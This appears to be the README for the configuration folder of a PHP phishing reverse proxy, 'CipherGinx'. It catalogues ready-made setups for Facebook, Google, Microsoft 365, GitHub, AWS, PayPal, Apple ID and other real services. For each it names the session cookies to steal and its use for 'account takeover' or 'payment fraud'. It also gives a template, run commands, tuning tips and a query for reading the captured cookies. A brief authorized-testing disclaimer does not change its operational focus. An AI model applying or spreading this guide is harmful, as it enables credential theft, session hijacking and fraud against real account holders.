# CipherGinx PHP - Available Target Configurations

This directory contains pre-built phishing configurations for various popular services. Each configuration is optimized for capturing credentials and cookies from that specific platform.

## Available Configurations

### Social Media & Communication

#### Facebook (`facebook.php`)
- **Target:** facebook.com
- **Captures:** c_user, xs, fr, datr, sb (authentication cookies)
- **Best for:** Account hijacking, credential theft
- **Usage:** `sudo php ../bin/cipherginx -c facebook`

#### LinkedIn (`linkedin.php`)
- **Target:** linkedin.com
- **Captures:** JSESSIONID, li_at, li_rm (session tokens)
- **Best for:** Professional account compromise, data harvesting
- **Usage:** `sudo php ../bin/cipherginx -c linkedin`

#### Twitter/X (`twitter.php`)
- **Target:** twitter.com / x.com
- **Captures:** auth_token, ct0, personalization_id (auth tokens)
- **Best for:** Account takeover, tweet manipulation
- **Usage:** `sudo php ../bin/cipherginx -c twitter`

#### Instagram (`instagram.php`)
- **Target:** instagram.com
- **Captures:** sessionid, ig_did, csrftoken (session cookies)
- **Best for:** Account hijacking, post manipulation
- **Usage:** `sudo php ../bin/cipherginx -c instagram`

#### Slack (`slack.php`)
- **Target:** slack.com
- **Captures:** d, d-s, lc, __ssid (workspace tokens)
- **Best for:** Workspace infiltration, data exfiltration
- **Usage:** `sudo php ../bin/cipherginx -c slack`

### Email & Cloud Storage

#### Google Account (`google.php`)
- **Target:** accounts.google.com
- **Captures:** __Secure-3PSID, NID, HSID (session tokens)
- **Best for:** Gmail access, 2FA interception
- **Usage:** `sudo php ../bin/cipherginx -c google`

#### Microsoft/Office 365 (`microsoft.php`)
- **Target:** login.microsoft.com
- **Captures:** ESTSAUTH, ESTSAUTHPERSISTENT (auth tokens)
- **Best for:** Outlook access, corporate account compromise
- **Usage:** `sudo php ../bin/cipherginx -c microsoft`

#### Dropbox (`dropbox.php`)
- **Target:** www.dropbox.com
- **Captures:** djsessionid, t, gvc (session cookies)
- **Best for:** File access, data theft
- **Usage:** `sudo php ../bin/cipherginx -c dropbox`

### Development & Enterprise

#### GitHub (`github.php`)
- **Target:** github.com
- **Captures:** _gh_sess, logged_in, user_session (auth tokens)
- **Best for:** Repository access, code theft, SSH key compromise
- **Usage:** `sudo php ../bin/cipherginx -c github`

#### AWS Console (`aws.php`)
- **Target:** signin.aws.amazon.com
- **Captures:** AWSALB, session-token (AWS tokens)
- **Best for:** Cloud infrastructure compromise, credential theft
- **Usage:** `sudo php ../bin/cipherginx -c aws`

### Financial Services

#### PayPal (`paypal.php`)
- **Target:** login.paypal.com
- **Captures:** JSESSIONID, X-PP-L7 (session tokens)
- **Best for:** Account takeover, payment fraud
- **Usage:** `sudo php ../bin/cipherginx -c paypal`

### Other Platforms

#### Apple ID (`apple.php`)
- **Target:** appleid.apple.com
- **Captures:** X-APPLE-SESSION-TOKEN, X-APPLE-ID-SESSION-ID
- **Best for:** iCloud access, Apple device compromise
- **Usage:** `sudo php ../bin/cipherginx -c apple`

---

## Creating Custom Configurations

To create a configuration for a new target:

1. **Copy template:**
   ```bash
   cp example.php custom_target.php
   ```

2. **Edit configuration:**
   ```php
   <?php
   return [
       'hostname' => 'target.com',
       'isSSL' => true,
       'server' => 'localhost',
       'port' => 443,
       
       'inject_domain' => [
           ['target.com', 'localhost'],
       ],
       
       'get_cookie' => [
           'SESSION_ID',
           'AUTH_TOKEN',
       ],
   ];
   ```

3. **Run proxy:**
   ```bash
   sudo php ../bin/cipherginx -c custom_target
   ```

## Configuration Options

### Core
- `hostname` — Target domain name
- `isSSL` — Use HTTPS (true/false)
- `server` — Local binding address (localhost, 0.0.0.0, etc)
- `port` — Local port (443, 8443, etc)

### Domain Injection
- `inject_domain` — Replace domains in requests/responses
  ```php
  ['original.com', 'replacement.com']
  ```

### HTTP Modification
- `req_headers` — Modify request headers by path
  ```php
  ['/path', ['Header-Name' => 'value']]
  ```
- `resp_headers` — Modify response headers
- `req_body` — Replace request body content
- `resp_body` — Replace response body content

### Blocking & Capturing
- `block_paths` — Paths to block (return 200 OK)
- `get_cookie` — Cookie names to capture and store

## Best Practices

1. **Use Correct Target Domain**
   - Use the actual login domain, not just the main domain
   - Example: `login.microsoft.com`, not `microsoft.com`

2. **Configure Domain Injection**
   - Replace ALL subdomains used by target
   - Include API endpoints
   - Test with browser developer tools

3. **Capture Key Cookies**
   - Session cookies (often have `session`, `auth`, `token` in name)
   - Authentication tokens
   - CSRF tokens

4. **Test Before Deployment**
   ```bash
   # Test with debug logging
   sudo php ../bin/cipherginx -c target -l debug
   ```

5. **Monitor Captured Data**
   ```bash
   # Check database
   mysql -u root -p cipherginx
   SELECT * FROM captured_cookies ORDER BY captured_at DESC;
   
   # Check logs
   tail -f ../logs/cipherginx.log
   tail -f ../logs/tokens.txt
   ```

---

## Security Notes

⚠️ **Legal & Ethical Disclaimer:**
- These configurations are for **authorized security testing only**
- Unauthorized phishing is **illegal**
- Always obtain written permission before testing
- Use in controlled lab environments only
- Test on systems you own or have explicit authorization to test

---

## Troubleshooting

### Cookies Not Being Captured
- Verify `get_cookie` contains correct cookie names
- Check browser dev tools (F12 → Application → Cookies) for actual names
- Some cookies may have platform-specific prefixes (`__Host-`, `__Secure-`)

### Domain Injection Not Working
- Ensure all subdomains are listed in `inject_domain`
- Check for hardcoded domains in JavaScript
- Use browser console to verify domain replacement

### Connection Refused
- Ensure port is correct (443 requires sudo)
- Check SSL certificate exists: `ls -la ../certs/server.pem`
- Verify no other service is using the port

---

## Support

For configuration questions, refer to:
- `../README.md` — Project overview
- `../docs/SETUP.md` — Installation guide
- `../docs/ARCHITECTURE.md` — Technical details
